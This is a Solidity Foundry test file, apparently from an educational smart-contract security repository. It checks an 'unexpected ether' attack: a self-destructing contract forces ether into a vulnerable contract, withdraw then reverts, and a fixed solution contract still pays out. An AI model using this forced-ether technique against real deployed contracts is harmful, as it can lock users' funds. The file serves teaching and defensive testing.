// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../contracts/UnexpectedEther.sol";
import "../../contracts/UnexpectedEtherSolution.sol";
import "../TestUtils.sol";
import "./Suicidal.sol";

contract UnexpectedEtherAttack is Test, TestUtils {
    UnexpectedEther public unexpectedEther;
    UnexpectedEtherSolution public solution;

    constructor() {
        unexpectedEther = new UnexpectedEther();
        solution = new UnexpectedEtherSolution();
    }

    function setUp() public {
        // deposit 5 ether
        for (uint256 index = 0; index < 5; index++) {
            unexpectedEther.play{value: 1 ether}();
            solution.play{value: 1 ether}();
        }

        assertTrue(balanceOf(address(unexpectedEther)) == 5 ether);
        assertTrue(balanceOf(address(solution)) == 5 ether);
    }

    function test_genuineWithdrawal() public {
        assertTrue(balanceOf(address(unexpectedEther)) == 5 ether);
        unexpectedEther.withdraw();
        assertTrue(balanceOf(address(unexpectedEther)) == 0 ether);
    }

    function test_AttackOnVulnerableContract() public {
        new Suicidal().kill{value: 0.1 ether}(payable(address(unexpectedEther)));
        assertTrue(balanceOf(address(unexpectedEther)) == 5.1 ether);
        vm.expectRevert();
        unexpectedEther.withdraw();
    }

    function test_AttackOnSolutionContract() public {
        new Suicidal().kill{value: 0.1 ether}(payable(address(solution)));
        assertTrue(balanceOf(address(solution)) == 5.1 ether);
        solution.withdraw();
        assertTrue(balanceOf(address(solution)) == 0.1 ether);
    }

    receive() external payable {}

}
